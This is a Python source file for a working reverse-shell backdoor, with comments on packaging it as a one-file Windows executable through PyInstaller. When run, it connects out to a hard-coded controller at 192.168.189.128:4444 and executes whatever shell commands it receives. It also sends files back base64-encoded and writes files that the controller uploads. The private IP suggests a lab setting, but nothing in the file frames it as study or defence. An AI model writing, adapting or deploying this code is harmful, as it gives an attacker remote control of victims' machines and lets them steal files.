import socket
import subprocess
import json
import os
import base64
import sys


# pip install pyinstaller
# C:\python312\Scripts\pyinstaller.exe Reverse_Backdoor.py --onefile 
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET,
                                        socket.SOCK_STREAM)  #AF_INET is used to create socket IPV4 AF_INET6 for IPV6
        self.connection.connect((ip, port))  # SOCK_STREAM is used to create socket base on TCP

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        if command[0] == "exit":
            self.connection.close()
            sys.exit()
        else:
            try:
                return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                return e.output

    def change_working_directory_to(self, path):
        os.chdir(path)
        message = "[+] changing working directory to " + str(path)
        return message

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."

    def start(self):
        while True:
            #connection.send(bytes(mail)) # new socket can only send bytes type 
            command = self.reliable_receive()  # set size of each batch data
            try:
                if command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command[2] = command[2].replace("'", "")[1:].encode()
                    self.write_file(command[1], command[2])
                    command_result = "UPLOAD SUCCESSFUL."
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command excution."
            self.reliable_send(command_result)


my_backdoor = Backdoor("192.168.189.128", 4444)
my_backdoor.start()
